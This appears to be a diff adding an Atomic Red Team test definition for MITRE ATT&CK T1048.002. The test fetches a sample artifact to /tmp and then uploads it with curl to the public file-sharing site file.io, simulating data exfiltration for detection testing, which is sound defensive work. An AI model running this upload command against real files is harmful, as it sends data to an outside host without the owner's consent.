@@ -1,0 +1,25 @@
+attack_technique: T1048.002
+display_name: Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
+atomic_tests:
+- name: Exfiltrate data HTTPS using curl freebsd,linux or macos
+  auto_generated_guid: 4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01
+  description: |
+    Exfiltrate data HTTPS using curl to file share site file.io
+  supported_platforms:
+  - macos
+  - linux
+  dependency_executor_name: bash
+  dependencies:
+  - description: |
+      The file must exist at specified location (/tmp/artifact).
+    prereq_command: |
+      if [ -f /tmp/artifact ]; then exit 0; else exit 1; fi;
+    get_prereq_command: |
+      curl -o /tmp/artifact https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1048.002/src/artifact
+  executor:
+    name: bash
+    elevation_required: false
+    command: |
+      curl -F 'file=@/tmp/artifact' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/
+    cleanup_command: |
+
